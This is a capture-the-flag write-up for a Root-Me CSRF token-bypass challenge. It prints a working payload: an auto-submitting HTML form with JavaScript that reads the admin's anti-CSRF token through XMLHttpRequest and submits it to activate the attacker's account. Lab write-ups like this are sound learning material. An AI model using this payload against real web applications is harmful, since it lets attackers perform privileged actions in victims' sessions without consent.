# CSRF - token bypass

**Point**: 45 Points

## Solution:

This is a  CSRF vulnerability with adding 1 secure layer - **CSRF token** . Get in the page, we see a form: 

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159601753-f08b4ef7-75f1-43b3-8b28-3b0c8e0a5aea.png" ></p>

Before "Login", we have to register. Move to "Register" and create an account. For example, in my case, username is `khangtictoc` and password is `123`

Log in this account. Move to "Private" 

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159602721-0d988354-cb0f-43bd-ba64-49e8a20feea5.png" ></p>


This section is for activated account. So we could reach that via sending a malicious HTML content to "Contact". 

But how do we achieve this action ? In "Profile", there's a **disable** checkbox and a button "Submit". 

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159603119-dc64359d-bb4e-4fb7-bfbd-0114c02b2d94.png" ></p>

Enable the checkbox, in "Dev Tool" (F12) replace `disabled=""` with `checked`. Then click "Submit" button.

```html
<input type="checkbox" name="status" checked>
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159631629-ce07c8ba-5e3f-4b6c-bf37-ed9a7a6b287d.png" ></p>

Only **admin** can do this action. But we could make **administrator** do the activation for us. Move to "Network" section, examine **Request Headers**:

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159632033-7ee73905-fbe4-4313-9815-5ab0901ca2d8.png" ></p>

With **Origin** and **Referer** headers, this can prevent CSRF if server checks it, but this chall does not use. But there's is another things we should care for.

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159632330-9b687a4d-36c1-45d5-8399-97d8929bb325.png" ></p>

The form has a token for anti-CSRF. You may be aware that this token is changed for each time we submit or reload a page again. So we can't use old attack because beside **Cookie**, there's one-time-used token that we didn't know from **admin**.  

Our idea is we'll collect the token as soon as our script is loaded in **admin side**; and then submit it with the form. We just have to write some more **Javascript** code do this task. Constructing an auto-submit form. Copy the given form:

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159633736-f00ef5dd-888d-4a4e-ab05-4d2796594167.png" ></p>

Changing `checkbox` as we've done previous. Create payload: 
- Make sure value in **input/type=text** is our **username** 
- Set `action` to "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" for fixed path, we can "POST" data no matters the place(domain) we are
- Add **javascript code** for auto-submit.
- Put the payload in full **HTML format**. The payload 's contained in `<html></html>` and in `<body></body>`

Let's write a 'gadget' code to receive **admin's token.** View the request in "Network" tab. Our request use `GET` method. There're many measures we can create a `GET` request. [Popular way creating http request in JS!](https://www.freecodecamp.org/news/here-is-the-most-popular-ways-to-make-an-http-request-in-javascript-954ce8c95aaa/)

The most convenient way is using AJAX. ( FYI: AJAX supports many **http verbs** like `GET` `PUT` `POST` , ...)

```javascript

// You can run line-by-line to debug and see the result in "Console" tab
// Create a "GET" Request  
var getRequest = new XMLHttpRequest();

// Little tricky here ! We should set 3rd parameter to "false" value. It means we turn off "asynchronous". 
// If not, GET request will run seperately and "tokenAdmin" is created before the token's data from the form return; therefore, "tokenAdmin" returns "null"
getRequest.open("GET", "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile", false);

// Send it to server.
getRequest.send();

// Use regex to get the token from admin; Our token is a hash having a fixed value of 32 characters (256 bits)
var tokenAdmin = getRequest.response.match(/[qwertyuiopasdfghjklzxcvbnm1234567890]{32}/)[0];

// Change the value of token in the form to admin'token for submitting
document.getElementById('token').value = tokenAdmin;
// Auto submit the form 
document.getElementById('profile').submit();

```

Combine with the original form we extracted. Our final payload:

Your email: khangtictoc@gmail.com (arbitrary string)

Comment:

```html
<html>
    <body>
        <form id="profile" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" method="post" enctype="multipart/form-data">
            <div>
            <label>Username:</label>
            <input id="username" type="text" name="username" value="khangtictoc">
            </div>
            <br>		
            <div>
            <label>Status:</label>
            <input id="status" type="checkbox" name="status" checked>
            </div>
            <br>
            <input id="token" type="hidden" name="token" value="">
            <button type="submit">Submit</button>
        </form>
        <script>
            var getRequest = new XMLHttpRequest();
            getRequest.open("GET", "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile", false);
            getRequest.send();

            var tokenAdmin = getRequest.response.match(/[qwertyuiopasdfghjklzxcvbnm1234567890]{32}/)[0];

            document.getElementById('token').value = tokenAdmin;
            document.getElementById('profile').submit();
        </script>
    </body>
</html>
```

Wait for a while for autbot's working. Direct to "Private" section:

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159635785-ca8689b6-8d08-4562-90e8-233a98ed7efe.png" ></p>

**NOTE: The flag says that we should use XSS vulnerability to bypass but i don't know how. So, screw it :))**

Flag: **Byp4ss_CSRF_T0k3n-w1th-XSS**
